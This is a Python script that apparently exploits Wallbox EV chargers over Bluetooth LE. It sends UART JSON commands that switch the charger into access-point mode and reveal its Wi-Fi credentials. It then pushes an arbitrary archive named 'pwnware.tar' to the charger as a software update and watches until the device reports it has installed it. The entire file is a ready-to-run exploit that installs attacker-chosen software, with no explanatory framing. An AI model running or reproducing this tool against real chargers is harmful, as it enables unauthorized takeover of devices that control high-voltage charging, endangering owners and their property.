import asyncio
import contextlib
import hashlib
import json
import random
import socket

from bleak import BleakClient, BleakScanner
from bleak.backends.characteristic import BleakGATTCharacteristic

UART_SERVICE_UUID = "331a36f5-2459-45ea-9d95-6142f0c4b307"
UART_RX_CHAR_UUID = "a9da6040-0823-4995-94ec-9ce41ca28833"
UART_TX_CHAR_UUID = "a73e9a10-628f-4494-a099-12efaf72258f"

class WallboxBLE():
    def __init__(self):
        self.all_data = bytearray()
        self.evt = asyncio.Event()
        self.response = {}

    async def connect(self, device):
        self.client = BleakClient(device, timeout=30)
        await self.client.connect()

        await self.client.start_notify(UART_TX_CHAR_UUID, self.handle_rx)
        nus = self.client.services.get_service(UART_SERVICE_UUID)
        self.rx_char = nus.get_characteristic(UART_RX_CHAR_UUID)

    async def handle_rx(self, _: BleakGATTCharacteristic, data: bytearray):
        self.all_data += data
        try:
            parsed_data = json.loads(self.all_data)
            if parsed_data["id"] == self.request_id:
                self.response = parsed_data.get("r")
                self.evt.set()
        except:
            pass

    async def execute(self, method, parameter=None):
        self.request_id = random.randint(1, 999)
        self.all_data = bytearray()
        self.response = {}

        payload = { "met": method, "par": parameter, "id": self.request_id }

        data = json.dumps(payload, separators=[",", ":"])
        data = bytes(data, "utf8")
        data = b"EaE" + bytes([len(data)]) + data
        data = data + bytes([sum(c for c in data) % 256])

        await self.client.write_gatt_char(self.rx_char, data, True)

        with contextlib.suppress(asyncio.TimeoutError):
            await asyncio.wait_for(self.evt.wait(), 10)
        self.evt.clear()
            
        return self.response

async def main():
    devices = await BleakScanner.discover()

    # Find device
    wallboxes = [d for d in devices if d.name is not None and d.name.startswith("WB")]
    if not wallboxes:
        print("No Wallbox found within Bluetooth range")
    print("Please choose Wallbox:")
    for i, wb in enumerate(wallboxes):
        print(f"{i}) {wb.name} ({wb.address})")
    chosen_idx = int(input("> "))

    # Connect Bluetooth and setup AP
    wb = WallboxBLE()
    await wb.connect(wallboxes[chosen_idx])

    print("Setting Wallbox to AP mode")
    wifi_creds = await wb.execute("s_hup")
    if "ssid" not in wifi_creds:
        print("Failed to set Wallbox to AP mode")
        return

    # Read payload and prepare Wallbox to receive
    payload = open("pwnware.tar", "rb").read()
    md5 = hashlib.md5(payload).hexdigest()

    await wb.execute("s_deb", {"deb":"software.tar.gz","md5":md5,"size":str(len(payload))})

    hup_data = await wb.execute("r_hup")
    if hup_data.get('st') != "recv":
        print("Wallbox not ready for pwnware, try again")

    print(f"Wallbox AP is ready, connect to {wifi_creds['ssid']} using password {wifi_creds.get('pass')}, then press return")
    input("> ")

    # Send payload over TCP
    print("Sending pwnware")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((wifi_creds.get("ip"), int(wifi_creds.get("port"))))
    s.sendall(payload)
    data = s.recv(1024)
    if data == b'FileReceived!':
        print("Pwnware was received by Wallbox")
    s.close()

    # Wait for Wallbox to process pwnware
    while True:
        hup_data = await wb.execute("r_hup")
        if hup_data.get('st') == "proc":
            print("Wallbox is processing pwnware...")
            break
        await asyncio.sleep(2)
    while True:
        hup_data = await wb.execute("r_hup")
        if hup_data.get('st') == "done":
            print("Wallbox was pwnd successfully!")
            break
        await asyncio.sleep(2)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except asyncio.exceptions.CancelledError:
        pass
